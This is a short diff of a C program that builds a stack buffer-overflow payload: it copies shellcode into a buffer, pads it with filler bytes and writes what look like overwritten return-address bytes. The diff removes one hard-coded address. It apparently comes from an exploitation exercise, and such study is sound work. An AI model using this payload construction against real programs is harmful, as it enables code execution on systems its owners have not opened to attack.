@@ -12,13 +12,9 @@ void main() {
 
 	buffer = malloc(269);
 	strcpy(buffer, shellcode);
-	for (i = 45; i < 260; i++) {
+	for (i = 45; i < 264; i++) {
 		buffer[i] = '\x42';
 	}
-	buffer[260] = '\x60';
-	buffer[261] = '\xf8';
-	buffer[262] = '\xff';
-	buffer[263] = '\xbf';
 
 	buffer[264] = '\x34';
 	buffer[265] = '\xf7';
